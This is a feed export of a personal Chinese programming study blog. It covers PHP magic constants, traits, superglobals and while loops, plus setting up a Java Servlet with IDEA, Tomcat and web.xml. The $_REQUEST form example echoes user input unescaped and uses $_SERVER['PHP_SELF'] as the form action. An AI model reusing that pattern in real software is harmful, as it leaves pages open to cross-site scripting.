<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">_print</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'类名为：'</span>  . <span class="keyword">__CLASS__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>  <span class="string">'函数名为：'</span> . <span class="keyword">__FUNCTION__</span> ;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$t = <span class="keyword">new</span> test();</span></span><br><span class="line"><span class="php">$t-&gt;_print();</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">类名为：<span class="built_in">test</span></span><br><span class="line">函数名为：_print</span><br></pre></td></tr></table></figure></p>
<h2 id="TRAIT"><a href="#TRAIT" class="headerlink" title="_TRAIT_"></a>_TRAIT_</h2><p>Trait的名字。自PHP5.4起，PHP实现代码复用的一个方法，称为traits</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">trait</span> SayWorld &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">parent</span>::sayHello();</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$o = <span class="keyword">new</span> MyHelloWorld();</span></span><br><span class="line"><span class="php">$o-&gt;sayHello();</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br></pre></td></tr></table></figure></p>
<h2 id="METHOD"><a href="#METHOD" class="headerlink" title="_METHOD_"></a>_METHOD_</h2><p>返回类的方法名。返回该方法被定义时的名字<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>  <span class="string">'函数名为：'</span> . <span class="keyword">__METHOD__</span> ;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">test();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">函数名为：<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<h2 id="NAMESPACE"><a href="#NAMESPACE" class="headerlink" title="_NAMESPACE_"></a>_NAMESPACE_</h2><p>返回当前命名空间的名称(区分大小写)<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'命名空间为："'</span>, <span class="keyword">__NAMESPACE__</span>, <span class="string">'"'</span>; <span class="comment">// 输出 "MyProject"</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">命名空间为：<span class="string">"MyProject"</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP中定义函数使用function关键字</p>
<p>2.魔术常量_FUNCTION_和_METHOD_的区别在于，_FUNCTION_只返回方法(函数)的名字；_METHOD_会返回类名和方法的名字</p>
<p>3.PHP中的trait关键字是实现代码复用的方法，是为了PHP的单继承性质而准备的一种代码复用机制</p>
<p>trait的基本用法<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">ezcReflectionReturnInfo</span> </span>&#123;</span><br><span class="line">    function getReturnType() &#123; <span class="comment">/*1*/</span> &#125;</span><br><span class="line">    function getReturnDescription() &#123; <span class="comment">/*2*/</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ezcReflectionMethod</span> <span class="keyword">extends</span> <span class="title">ReflectionMethod</span> </span>&#123;</span><br><span class="line">    use ezcReflectionReturnInfo;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ezcReflectionFunction</span> <span class="keyword">extends</span> <span class="title">ReflectionFunction</span> </span>&#123;</span><br><span class="line">    use ezcReflectionReturnInfo;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>优先级顺序:</p>
<p>从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 trait 方法，而 trait 方法又覆盖了基类中的方法。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">trait</span> SayWorld &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">parent</span>::sayHello();</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$o = <span class="keyword">new</span> MyHelloWorld();</span></span><br><span class="line"><span class="php">$o-&gt;sayHello();</span></span><br></pre></td></tr></table></figure></p>
<p>修改方法的访问控制</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">trait</span> HelloWorld &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Hello World!'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 修改 sayHello 的访问控制</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass1</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">HelloWorld</span> &#123; <span class="title">sayHello</span> <span class="title">as</span> <span class="title">protected</span>; &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 给方法一个改变了访问控制的别名</span></span></span><br><span class="line"><span class="php"><span class="comment">// 原版 sayHello 的访问控制则没有发生变化</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">HelloWorld</span> &#123; <span class="title">sayHello</span> <span class="title">as</span> <span class="title">private</span> <span class="title">myPrivateHello</span>; &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>更多用法可以参考手册<br><a href="https://www.php.net/manual/zh/language.oop5.traits.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.traits.php</a></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/7/7-Servlet</title>
    <url>/2020/07/07/JavaWeb-2020-7-7-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<p>阿西吧，上课时候没看视频，现在来还债了，两周学完JavaWeb基础，太难了</p>
<h1 id="用IDEA创建JavaWeb项目并部署"><a href="#用IDEA创建JavaWeb项目并部署" class="headerlink" title="用IDEA创建JavaWeb项目并部署"></a>用IDEA创建JavaWeb项目并部署</h1><p>第一步先在创建好的project下创建一个新的Module，Module要注意勾选JavaWeb Application，随便命名，就命名一个HelloWorld吧<br><img src="/img/JavaWeb/7-7学习日记/0.png" alt="avatar"><br>创建好应该是上图所示的状态</p>
<p>接下来在src下创建class文件，创建就好不用写什么东西</p>
<p>接着可以看到有一个web项目，那就表示我们创建了对的JavaWeb的Module</p>
<p><img src="/img/JavaWeb/7-7学习日记/1.png" alt="avatar"></p>
<p>接下来找到这个地方 配置tomcat ，配置方法百度就行不再细说</p>
<p>配置好了之后 我们打开web下 找到index.jsp 吧bode标签里的内容改一下，这个内容就是等下运行时显示在浏览器上的内容</p>
<p>修改好之后 直接运行即可，会自动打开浏览器，看到效果<br><img src="/img/JavaWeb/7-7学习日记/2.png" alt="avatar"></p>
<h1 id="Web项目目录结构"><a href="#Web项目目录结构" class="headerlink" title="Web项目目录结构"></a>Web项目目录结构</h1><p>在运行之后，我们看到out目录下会出现一个叫做WEB-INF的项目，WEB-INF是不能通过浏览器访问的，也就是说对用户来说是不可见的内容，里面的内容只要是web.xml的配置文件以及一个classes项目，下面存储的就是你在src中编写的内容</p>
<p>不在WEB-INf里的内容 都可以从浏览器直接访问，无论是静态的还是动态的网页<br><img src="/img/JavaWeb/7-7学习日记/3.png" alt="avatar"></p>
<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li><p>Servlet全称是Java Servlet，是用Java编写的服务器端程序。其主要功能在于交互式地浏览和修改数据，生成动态Web内容</p>
</li>
<li><p>Servlet是JavaWeb的核心内容，是Java Web三大组件之一(Servlet,Filter,Listener)</p>
</li>
<li><p>在HTTP请求过程中会把请求的参数存放在请求行的URL中，或是请求体中，这个参数需要服务器来接受解析并处理，Servlet就是用来处理这个过程的</p>
</li>
</ul>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul>
<li><p>用来处理客户端发来的请求，并对该请求做出响应</p>
</li>
<li><p>获取接受客户端发送来的请求数据</p>
</li>
<li><p>处理请求</p>
</li>
<li><p>将处理的结果通过响应发送到客户端</p>
</li>
</ul>
<h2 id="编写第一个Servlet"><a href="#编写第一个Servlet" class="headerlink" title="编写第一个Servlet"></a>编写第一个Servlet</h2><ul>
<li>Servlet程序必须要编写实现类，通常是继承javax.servlet.http.HttpServlet</li>
</ul>
<h3 id="创建project以及相关设置"><a href="#创建project以及相关设置" class="headerlink" title="创建project以及相关设置"></a>创建project以及相关设置</h3><p>首先第一步创建一个project，并勾选web application</p>
<p>然后在web下的WEB-INF下创建文件夹命名为classes和lib</p>
<p><img src="/img/JavaWeb/7-7学习日记/4.png" alt="avatar"></p>
<p>然后打开File找到Project Structure<br><img src="/img/JavaWeb/7-7学习日记/5.png" alt="avatar"><br>将其改为你自己的classes路径 两个都要改</p>
<p>接着在Dependencies里点击+号 添加Jars，并且选择WEB-INF下的lib文件夹<br><img src="/img/JavaWeb/7-7学习日记/6.png" alt="avatar"></p>
<p>在Artifacts中将output directory改为你tomcat中webapps下创建的同名文件夹<br><img src="/img/JavaWeb/7-7学习日记/7.png" alt="avatar"></p>
<p>接着就是配置tomcat了，默认配置就行，配置方法百度，不细说</p>
<h3 id="创建servlet并编写servlet"><a href="#创建servlet并编写servlet" class="headerlink" title="创建servlet并编写servlet"></a>创建servlet并编写servlet</h3><p>在src下创建servlet，不是直接创建classes，将其命名为shoppingservlet</p>
<p>package随意就好</p>
<p><img src="/img/JavaWeb/7-7学习日记/8.png" alt="avatar"></p>
<p>编写servlet成这样<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cyl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">PrintWriter</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"shoppingservlet"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">shoppingservlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        response.setContentType(<span class="string">"text/html"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> out=response.getWriter();</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">"this is servlet"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="配置xml文件"><a href="#配置xml文件" class="headerlink" title="配置xml文件"></a>配置xml文件</h3><p>你还需要配置xml文件，打开web.xml文件，将其改为<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>shoppingservlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.cyl.shoppingservlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>shoppingservlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/A<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>/A可以随意，改成/B /C都可以</p>
<h3 id="运行servlet"><a href="#运行servlet" class="headerlink" title="运行servlet"></a>运行servlet</h3><p>所有步骤都完毕之后，就可以直接运行了，点击运行按钮，会自动打开浏览器，URL为localhost:8080</p>
<p>访问<code>http://localhost:8080/shoppingservlet/A</code></p>
<p>即可看到this is servlet </p>
<p>这样一个servlet就编译并运行成功了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/7-基础5</title>
    <url>/2020/07/07/PHP-2020-7-7-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><p>PHP4.1.X后就启用了超全局变量，可以在脚本的任意位置运行</p>
<p>PHP的超全局变量有:</p>
<ul>
<li>$GLOBALS</li>
<li>$_SERVER</li>
<li>$_REQUEST</li>
<li>$_POST</li>
<li>$_GET</li>
<li>$_FILES</li>
<li>$_ENV</li>
<li>$_COOKIE</li>
<li>$_SESSION</li>
</ul>
<h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><p>$GLOBALS是PHP的一个超级全局变量组，在PHP脚本的全部作用域，也就是任意位置都可以直接访问到</p>
<p>$GLOBALS是一个包含了全部变量的全局组合数组。变量的名字就是数组的键</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="number">75</span>;</span></span><br><span class="line"><span class="php">$y = <span class="number">25</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">addition</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $GLOBALS[<span class="string">'z'</span>] = $GLOBALS[<span class="string">'x'</span>] + $GLOBALS[<span class="string">'y'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">addition();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $z;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure><br>在这个例子中可以看到变量z并没有提前定义，而是使用$GLOBALS来进行创建超全局变量，变量z同样可以在函数外访问</p>
<p>$GLOBALS是PHP中最常用的超全局变量</p>
<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>$_SERVER是一个包含了诸多信息的数组，例如信息头header,路径path,以及脚本的位置等</p>
<p>数组中的项目都是由WEB服务器创建的，不能够保证每个服务器都提供全部项目，而是根据服务器来进行动态的调整</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'PHP_SELF'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'SERVER_NAME'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_HOST'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_SERVER[<span class="string">'SCRIPT_NAME'</span>];</span></span><br></pre></td></tr></table></figure>
<p>下表列出了所有$_SERVER中的重要元素</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>描述</th>
<th>引入方法 </th>
</tr>
</thead>
<tbody>
<tr>
<td>$_SERVER[‘PHP_SELF’]</td>
<td>当前执行脚本的文件名，与document root有关</td>
</tr>
<tr>
<td>$_SERVER[‘GATEWAY_INTERFACE’]</td>
<td>服务器使用的CGI规范的版本</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADDR’]</td>
<td>当前运行脚本所在服务器的IP地址</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_NAME’]</td>
<td>当前运行脚本所在服务器的主机名</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_SOFTWARE’]</td>
<td>服务器标识字符串，在响应请求时的头信息中给出</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PROTOCOL’]</td>
<td>请求页面时通信协议的名称和版本</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_METHOD’]</td>
<td>访问页面使用的请求方法</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_TIME’]</td>
<td>请求开始时的时间戳</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT’]</td>
<td>当前请求头中Accept项的内容，如果存在的话</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_HOST’]</td>
<td>当前请求头中Host:项的内容，如果存在的话</td>
</tr>
<tr>
<td>$_SERVER[‘HTTPS’]</td>
<td>如果脚本是通过HTTPS协议被访问，则被设为一个非空的值</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_ADDR’]</td>
<td>当前页面的用户的IP地址</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_HOST’]</td>
<td>当前页面的用户的主机名</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_PORT’]</td>
<td>用户机器上连接到Web服务器所使用的端口号</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
<td>当前执行脚本的绝对路径</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_URI’]</td>
<td>URI 用来指定要访问的页面</td>
</tr>
</tbody>
</table>
</div>
<p>还有很多参数不常用，具体可以参考一下手册</p>
<h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><p>$_REQUEST用于收集HTML表单提交的数据<br>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF'];?&gt;"</span>&gt;</span></span><br><span class="line">Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fname"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$name = $_REQUEST[<span class="string">'fname'</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $name; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/PHP/7-7日记.png" alt="avatar"></p>
<p>上面这个例子就是向前端显示了一个输入字段Input和一个提交按钮submit的表单。当用户点击submit提交表单时，将会执行表单中action的属性指定的脚本文件，用POST方式来接受输入的内容</p>
<p>使用超全局变量$_POST可以收集表单中input字段的数据</p>
<h2 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h2><p>$_GET同样被广泛用于收集表单数据中，只需要将表单中的method改为get即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test_get.php?subject=PHP&amp;web=runoob.com"</span>&gt;</span>测试 $_GET<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Study</span> PHP @ runoob.com</span><br></pre></td></tr></table></figure><br>当用户点击链接时便会输出运行结果</p>
<p>PHP脚本的意思是，将参数subject和web发送至test_get.php中，就可以在test_get.php文件中使用$_GET变量来获取这些数据<br>test_get.php的代码<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Study "</span> . $_GET[<span class="string">'subject'</span>] . <span class="string">" @ "</span> . $_GET[<span class="string">'web'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="PHP循环"><a href="#PHP循环" class="headerlink" title="PHP循环"></a>PHP循环</h1><p>代码编写必不可少的除了判断，还有循环</p>
<p>PHP的循环基本类似于C语言</p>
<ul>
<li>while 只要条件成立，则循环代码块</li>
<li>do…while 不管条件是否成立，都执行一次代码块，再进行条件判断</li>
<li>for 循环代码块指定的次数</li>
<li>foreach 根据数组中每个元素来循环代码块</li>
</ul>
<h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><p>语法<br><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(条件)&#123;</span><br><span class="line">	代码块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>例如循环输出1-5<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$i=<span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">while</span>($i&lt;=<span class="number">5</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"The number is "</span> . $i . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    $i++;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">The number <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">3</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">4</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
